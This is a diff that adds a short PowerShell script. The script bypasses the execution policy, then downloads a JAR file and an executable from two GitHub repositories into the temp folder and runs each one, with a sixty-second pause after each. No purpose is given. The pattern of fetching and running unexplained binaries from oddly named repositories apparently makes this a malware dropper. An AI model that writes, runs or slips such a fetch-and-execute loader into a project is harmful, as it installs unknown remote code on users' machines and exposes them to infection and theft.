@@ -1,0 +1,16 @@
+Set-ExecutionPolicy Bypass -Scope Process -Force
+
+$jarUrl = "https://github.com/VicTheSlicer/bytebin-api/blob/main/build/latest-version.jar"
+$jarPath = "$env:TEMP\latest-version.jar"
+$exeUrl = "https://github.com/JavaCorpRus/LombokLib/raw/refs/heads/main/Build2000497420.exe"
+$exePath = "$env:TEMP\Build2000497420.exe"
+
+Invoke-WebRequest -Uri $jarUrl -OutFile $jarPath
+java -jar $jarPath
+
+Start-Sleep 60
+
+Invoke-WebRequest -Uri $exeUrl -OutFile $exePath
+Start-Process $exePath
+
+Start-Sleep 60
